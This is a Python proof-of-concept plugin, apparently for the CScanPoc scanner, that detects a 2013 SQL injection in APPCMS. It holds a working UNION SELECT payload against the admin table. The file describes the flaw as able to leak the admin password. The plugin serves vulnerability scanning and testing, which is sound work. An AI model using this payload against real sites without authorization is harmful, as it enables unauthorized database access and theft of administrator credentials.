# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'APPCMS_0001' # 平台漏洞编号，留空
    name = 'APPCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-12-11'  # 漏洞公布时间
    desc = '''
        APPCMS 前台sql注射漏洞可爆后台密码。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'APPCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '06780be3-c793-434b-8902-77bf587eeeb0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-045643
            payload = "/index.php?q=xxoo%27%20union%20select%20md5(1),2,3%20from%20appcms_admin_list%20where%20uid%20like%20%27"
            verify_url = self.target + payload
            #code, head, body, errcode, final_url = curl.curl2(target)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
